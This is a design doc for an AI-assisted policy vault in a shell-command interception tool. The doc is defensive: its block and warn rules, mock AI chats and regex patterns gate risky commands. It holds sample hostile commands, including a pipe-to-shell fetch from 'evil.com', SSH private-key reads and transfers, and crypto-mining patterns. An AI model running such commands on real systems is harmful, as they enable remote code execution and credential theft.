# AI-Assisted Policy Vault

> Design doc for replacing manual YAML editing with an AI-powered policy management system.

## Status

**Proposed** — February 2026

## The Problem Today

Dingleberry ships 24 regex rules in a single YAML file (`~/.dingleberry/policy.yml`). To add, modify, or remove a rule, users must:

1. Open `~/.dingleberry/policy.yml` in a text editor
2. Know the exact YAML format (`name`, `action`, `patterns`, `scope`, `description`)
3. Write valid regex patterns (most developers can't write regex from memory)
4. Click "Reload Policy" in the dashboard

The dashboard's Policy page is **read-only** — it displays rules grouped by tier (block/warn/safe) with a reload button, but has no editor. The `llm_policies` field (natural language rules for the LLM classifier) is even harder to discover since it's a flat list of strings with no UI at all.

This is a barrier to adoption. Security policies should be accessible to anyone who can describe what they want in plain English — not just developers comfortable with regex.

## Inspiration: LoreForge's Vault Architecture

LoreForge (a separate project) uses a **vault system** where content lives as individual markdown files with YAML frontmatter, managed by an AI agent (OpenCode) that understands the schema. Key patterns:

| LoreForge Pattern | Dingleberry Equivalent |
|---|---|
| Individual `.md` files per entity | Individual `.md` file per policy rule |
| YAML frontmatter (type, relationships, gating) | YAML frontmatter (action, patterns, scope) |
| `OPENCODE.md` system prompt defines schema | `POLICY_GUIDE.md` teaches AI the policy format |
| Slash commands (`/character`, `/location`) | Slash commands (`/rule`, `/policy`, `/audit`) |
| Vault sync → PostgreSQL index | Vault sync → PolicyEngine reload |
| Knowledge graph (entity relationships) | Rule dependencies (supersedes, related_to) |
| Creator-to-AI chat (questions, follow-ups) | User-to-AI chat for policy authoring |
| Vault notes (`<!-- @note -->`) for AI instructions | Inline notes for policy refinement |

The fundamental insight: **the AI doesn't need to understand regex.** The user says "block any command that reads SSH keys" and the AI generates the frontmatter, regex patterns, and natural language policy — then the user approves it.

## Proposed Architecture

### Policy Vault Structure

Move from a single YAML file to a directory of markdown files:

```
~/.dingleberry/
  config.yml                    # Existing config
  dingleberry.db                # Existing SQLite
  policies/                     # NEW: Policy vault
    _guide.md                   # AI system prompt (schema + conventions)
    block/
      rm-root.md
      disk-wipe.md
      fork-bomb.md
      drop-database.md
      drop-table.md
    warn/
      git-force-push.md
      rm-recursive.md
      curl-pipe-bash.md
      chmod-world-writable.md
      ...
    safe/
      file-listing.md
      file-reading.md
      search-commands.md
      git-read-only.md
      ...
    llm/                        # Natural language policies (LLM tier)
      no-ssh-exfiltration.md
      no-cron-modification.md
      warn-raw-ip-requests.md
```

### Policy File Format

Each policy rule is a markdown file with YAML frontmatter:

```markdown
---
name: git_force_push
action: warn
scope: shell
patterns:
  - "git\\s+push\\s+.*--force"
  - "git\\s+push\\s+-f\\b"
tags: [git, destructive, remote]
created: 2026-02-27
---

# Git Force Push

Intercepts `git push --force` and `git push -f` commands that could
overwrite remote history. These are held for human approval because
force-pushing can destroy teammates' work.

## Why This Matters

Force-pushing to shared branches rewrites history that other developers
may have already pulled. In the worst case, it permanently deletes
commits that exist only on the remote.

## Examples

```bash
git push --force origin main     # Caught
git push -f origin feature       # Caught
git push origin main             # NOT caught (no --force)
```
```

### LLM Policy File Format

Natural language policies for the LLM classification tier:

```markdown
---
name: no_ssh_exfiltration
action: block
scope: all
tags: [security, exfiltration, ssh]
created: 2026-02-27
---

# No SSH Key Exfiltration

Never allow commands that read, copy, compress, or transmit SSH private
keys. This includes direct reads (`cat ~/.ssh/id_rsa`), archival
(`tar` of `.ssh/`), encoding (`base64`), and network transfer (`curl`,
`scp`, `nc`) of key material.

The LLM classifier should flag any command that appears to access SSH
private key files, even if the exact pattern is novel.
```

The `llm/` directory files are parsed for their body text and fed as natural language policies to the LLM classifier. No regex needed — the markdown body IS the policy.

### AI Chat in the Dashboard

Add a chat panel to the Policy LiveView page. The AI conversation uses the existing `jido_ai` integration (already a dep) — no separate OpenCode process needed for the MVP.

```
┌─────────────────────────────────────────────────────────────┐
│ Policy Manager                                    [Reload]  │
├───────────────────────────────────┬─────────────────────────┤
│                                   │                         │
│  BLOCK (5 rules)                  │  Policy Assistant       │
│  ┌─────────────────────────┐      │                         │
│  │ rm-root                 │      │  You: I want to block   │
│  │ disk-wipe               │      │  any command that reads  │
│  │ fork-bomb               │      │  or copies SSH keys     │
│  │ drop-database           │      │                         │
│  │ drop-table              │      │  AI: I'll create a new  │
│  └─────────────────────────┘      │  block rule for SSH key │
│                                   │  exfiltration. Here's   │
│  WARN (12 rules)                  │  what I'll add:         │
│  ┌─────────────────────────┐      │                         │
│  │ git-force-push          │      │  name: ssh_key_exfil    │
│  │ rm-recursive      ...   │      │  action: block          │
│  └─────────────────────────┘      │  patterns:              │
│                                   │   - cat.*\.ssh/id_      │
│  SAFE (7 rules)                   │   - tar.*\.ssh          │
│  ┌─────────────────────────┐      │   - scp.*\.ssh/id_      │
│  │ file-listing             │     │                         │
│  │ file-reading       ...   │     │  I'll also add an LLM   │
│  └─────────────────────────┘      │  policy for novel       │
│                                   │  patterns.              │
│  LLM POLICIES (3)                 │                         │
│  ┌─────────────────────────┐      │  [Apply]  [Edit]        │
│  │ no-ssh-exfiltration     │      │                         │
│  │ no-cron-modification    │      │  ────────────────────── │
│  │ warn-raw-ip-requests    │      │  [Type a message...]    │
│  └─────────────────────────┘      │                         │
│                                   │                         │
└───────────────────────────────────┴─────────────────────────┘
```

### AI System Prompt (`_guide.md`)

A policy-specific instruction file (analogous to LoreForge's `OPENCODE.md`) that teaches the AI:

1. The policy file format (frontmatter schema + markdown body)
2. The three classification tiers and when to use each
3. How to write effective regex patterns for shell commands
4. When to create a regex rule vs. an LLM natural language policy
5. The existing rules (so it doesn't create duplicates)
6. How to test patterns against example commands

### Vault Sync Pipeline

When a policy file is created, modified, or deleted:

1. AI writes the file to `~/.dingleberry/policies/{tier}/{slug}.md`
2. `PolicyVault.sync/0` scans the directory, parses all frontmatter
3. Regex rules are compiled into the `PolicyEngine` (replacing the old single-YAML load)
4. LLM policies (from `llm/` dir) are extracted and loaded into the Engine state
5. PubSub broadcast triggers LiveView refresh
6. No restart needed — hot reload like today's "Reload Policy" button

```elixir
defmodule Dingleberry.Policy.Vault do
  @moduledoc "Manages policy rules as individual markdown files."

  alias Dingleberry.Policy.{Rule, Engine}

  @vault_dir Path.expand("~/.dingleberry/policies")

  def sync do
    {rules, llm_policies} = load_all()
    Engine.replace_rules(rules, llm_policies)
  end

  def load_all do
    rules =
      for tier <- ["block", "warn", "safe"],
          path <- list_files(Path.join(@vault_dir, tier)),
          {:ok, rule} <- [parse_rule(path, tier)] do
        rule
      end

    llm_policies =
      for path <- list_files(Path.join(@vault_dir, "llm")),
          {:ok, policy_text} <- [parse_llm_policy(path)] do
        policy_text
      end

    {rules, llm_policies}
  end

  defp parse_rule(path, _tier) do
    {frontmatter, _body} = parse_frontmatter(path)
    Rule.from_map(frontmatter)
  end

  defp parse_llm_policy(path) do
    {_frontmatter, body} = parse_frontmatter(path)
    {:ok, String.trim(body)}
  end
end
```

### Backward Compatibility

The single `policy.yml` file continues to work. The vault is opt-in:

1. If `~/.dingleberry/policies/` exists → use vault mode
2. If not → fall back to `~/.dingleberry/policy.yml` (current behavior)

`mix dingleberry.init` gains a `--vault` flag that creates the directory structure and migrates existing rules from `policy.yml` into individual files.

## AI Integration Options

### Option A: Built-in Jido.AI Chat (Recommended for MVP)

Use the existing `jido_ai` dep directly in the LiveView. No separate process.

**Pros:**
- Zero new infrastructure — jido_ai is already installed
- Works with any provider (Ollama local, Anthropic, OpenAI)
- Same model config as the LLM classifier
- LiveView chat panel is a straightforward component

**Cons:**
- Not as capable as a full coding agent (no file browsing, no tool use loop)
- AI generates policy text, but the Phoenix app writes the files

**Architecture:**
```
User types in LiveView chat
    → LiveView sends to PolicyAssistant (GenServer or inline)
    → PolicyAssistant calls Jido.AI.generate_object() with policy schema
    → Returns structured policy (frontmatter + body)
    → LiveView shows preview, user clicks "Apply"
    → Phoenix writes file to ~/.dingleberry/policies/
    → PolicyVault.sync() reloads rules
```

### Option B: OpenCode Integration (Full Power)

Run `opencode serve` alongside Dingleberry, with a workspace-bridge plugin.

**Pros:**
- Full coding agent with file read/write/edit tools
- Multi-turn reasoning, can browse existing policies
- Proven architecture from LoreForge
- Session continuity for complex policy conversations

**Cons:**
- Requires Node.js + `npm install -g opencode-ai`
- Extra process to manage
- More complex deployment
- Overkill for policy editing?

**Architecture:**
```
User types in LiveView chat
    → LiveView sends to OpenCodeClient
    → OpenCode reads _guide.md + existing policies
    → OpenCode writes/edits policy files directly
    → File watcher or plugin hook triggers PolicyVault.sync()
    → LiveView updates via PubSub
```

### Recommendation

**Start with Option A (Jido.AI chat)** for the MVP. It requires no new infrastructure, leverages what's already built, and covers 90% of the use case. If users need more sophisticated policy authoring (multi-file edits, dependency analysis, audit trail generation), Option B can be added later as an optional enhancement.

## Implementation Plan

### Phase 1: Vault Structure + Migration

1. Create `Dingleberry.Policy.Vault` module — reads policy dir, parses frontmatter
2. Create `Dingleberry.Policy.FrontmatterParser` — extracts YAML + body from `.md` files
3. Update `Policy.Engine` to accept rules from Vault or YAML (backward compat)
4. Create `mix dingleberry.migrate_policies` — converts `policy.yml` → individual files
5. Create `_guide.md` template — AI system prompt for policy authoring
6. Update `mix dingleberry.init --vault` to create directory structure

### Phase 2: Dashboard Policy Editor

7. Add inline editor to PolicyLive — click a rule to view/edit its markdown
8. Add "New Rule" button — creates a new policy file with template frontmatter
9. Add file watcher (or manual sync button) to reload after edits
10. Add delete confirmation for removing rules

### Phase 3: AI Chat Panel

11. Create `Dingleberry.Policy.Assistant` — GenServer managing AI conversation
12. Build chat LiveView component (message list + input)
13. Wire `Jido.AI.generate_object` for structured policy generation
14. "Apply" button writes generated policy to vault and syncs
15. "Explain" button — AI explains what a rule does in plain English
16. "Test" button — AI generates example commands and shows what would be caught

### Phase 4: Advanced Features

17. Policy templates — common rule packs (web dev, data science, DevOps)
18. Import/export — share policy vaults as tarballs or git repos
19. Policy dependencies — rules that reference other rules
20. Audit trail — git history of policy changes with AI-generated commit messages
21. OpenCode integration (Option B) for power users

## Example User Flows

### "I want to block cryptocurrency mining"

```
User: Block any cryptocurrency mining commands

AI: I'll create a block rule for crypto mining. Here's what I'll add:

  name: crypto_mining
  action: block
  scope: shell
  patterns:
    - "\\b(xmrig|cpuminer|minerd|cgminer|bfgminer)\\b"
    - "stratum\\+tcp://"
    - "\\b(cryptonight|ethash|equihash)\\b"

  I'll also add an LLM policy:
  "Block any command that appears to run cryptocurrency mining
   software, connect to mining pools, or use GPU/CPU for hash
   computation."

  [Apply Both]  [Apply Regex Only]  [Apply LLM Only]  [Edit]
```

### "What does the curl_pipe_bash rule catch?"

```
User: Explain the curl_pipe_bash rule

AI: The curl_pipe_bash rule (warn tier) catches commands that pipe
remote content directly into a shell interpreter:

  Caught:
    curl https://example.com/install.sh | bash
    wget -O- https://evil.com/payload | sh
    curl -s https://get.docker.com | sudo sh

  NOT caught:
    curl https://example.com/install.sh > install.sh  (saves to file)
    curl https://api.github.com/repos                 (no pipe to shell)
    wget https://example.com/file.tar.gz              (no pipe)

  This is a warn (not block) because pipe-to-shell is sometimes
  legitimate (installing Homebrew, Docker, Rust). The human reviewer
  decides case-by-case.
```

### "Make the npm rule less aggressive"

```
User: The npm_global_install rule keeps flagging npm install in my
project. I only want to warn on global installs.

AI: The current rule catches all `npm install` and `pip install`. I'll
narrow it to only flag global/system-wide installs:

  Before:
    - "npm\\s+install\\s+-g"
    - "pip\\s+install\\s+"        ← too broad
    - "gem\\s+install\\s+"

  After:
    - "npm\\s+install\\s+-g"
    - "pip\\s+install\\s+--system"
    - "sudo\\s+pip\\s+install"
    - "gem\\s+install\\s+"

  Local `pip install` and `npm install` (without -g) will now pass
  through as safe.

  [Apply]  [Edit]  [Show Diff]
```

---

*[Back to README](../README.md)* | *[LLM Classification Design](llm-classification.md)*
